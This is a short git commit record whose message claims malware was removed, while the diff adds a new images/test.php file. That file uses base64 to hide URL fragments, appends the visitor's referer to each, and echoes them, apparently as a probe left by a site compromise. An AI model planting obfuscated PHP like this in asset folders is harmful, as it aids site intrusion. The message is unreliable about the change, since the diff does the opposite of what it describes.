35ccfbc4660c62342597db01dbcf419fc8e0291d
Robert Hinson <oppiet35@yahoo.com>
2025-10-20 12:12:35 -0400

    Took out some malware...

---
+++ images/test.php
@@ -0,0 +1,5 @@
+<?php
+echo base64_decode("aHR0cDovL2FkczIu").$_SERVER["HTTP_REFERER"]."<br>";
+echo base64_decode("aHR0cDovLzcu").$_SERVER["HTTP_REFERER"]."<br>";
+echo base64_decode("aHR0cDovLzcxLg==").$_SERVER["HTTP_REFERER"]."<br>";
+die();
